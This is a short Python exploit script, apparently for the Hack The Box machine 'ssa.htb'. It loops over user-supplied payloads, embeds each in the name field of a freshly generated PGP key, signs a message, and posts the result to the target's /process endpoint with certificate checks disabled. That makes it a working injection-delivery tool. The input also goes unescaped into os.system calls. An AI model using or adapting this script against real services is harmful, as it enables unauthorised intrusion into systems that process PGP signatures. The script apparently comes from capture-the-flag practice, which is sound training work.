import os
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

url = "https://ssa.htb/process"

repeat = 'y'
while repeat.lower() == 'y':
    exploit = input("exploit: ")
    keygen_command = f'python3 keygen.py -p "whoami123" -n "{exploit}" -e "atlas@ssa.htb"'
    sign_command = 'python3 sign.py -c keypgp_uwu.pub.asc -k keypgp_uwu.key.asc -p "whoami123" -m "iess"'

    os.system(keygen_command)
    os.system(sign_command)
    with open("keypgp_uwu.pub.asc", "r") as file:
        public_key = file.read()

    signed_key_output = os.popen(sign_command)
    signed_key = signed_key_output.read().strip()

    data = {
        'signed_text': signed_key,
        'public_key': public_key
    }

    response = requests.post(url, data=data, verify=False)
    print(response.text)

    repeat = input("Run the program again? (y/n): ")
